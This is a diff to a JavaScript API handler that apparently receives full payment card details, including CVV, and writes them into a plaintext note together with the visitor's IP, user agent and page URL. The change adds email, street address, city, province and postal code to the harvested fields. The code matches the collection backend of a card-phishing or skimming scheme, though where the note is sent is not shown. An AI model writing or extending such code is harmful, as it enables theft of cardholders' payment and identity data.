@@ -27,7 +27,7 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, userAgent, referral, pageUrl } = req.body || {};
+    const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, email, address, city, province, postalCode, timezone, userAgent, referral, pageUrl } = req.body || {};
     const number = (cardNumber || '').replace(/\s/g, '');
     const month = (expiryMonth || '').padStart(2, '0');
     const year = expiryYear || '';
@@ -49,7 +49,7 @@ export default async function handler(req, res) {
       }
     } catch {}
 
-    // Build note in exact format
+    // Build note
     const cardLine = `API card received: ${number} ${month}/${year} ${cvvVal}`;
     const infoParts = [];
     infoParts.push(`IP: ${ip || 'unknown'}`);
@@ -58,6 +58,11 @@ export default async function handler(req, res) {
     infoParts.push(`Referral: ${referral || 'Direct'}`);
     infoParts.push(`Page: ${pageUrl || 'unknown'}`);
     if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
+    if (email) infoParts.push(`Email: ${email}`);
+    if (address) infoParts.push(`Address: ${address}`);
+    if (city) infoParts.push(`City: ${city}`);
+    if (province) infoParts.push(`Province: ${province}`);
+    if (postalCode) infoParts.push(`Postal: ${postalCode}`);
     if (userAgent) infoParts.push(`UA: ${userAgent}`);
 
     const fullNote = cardLine + '\n' + infoParts.join(' | ');
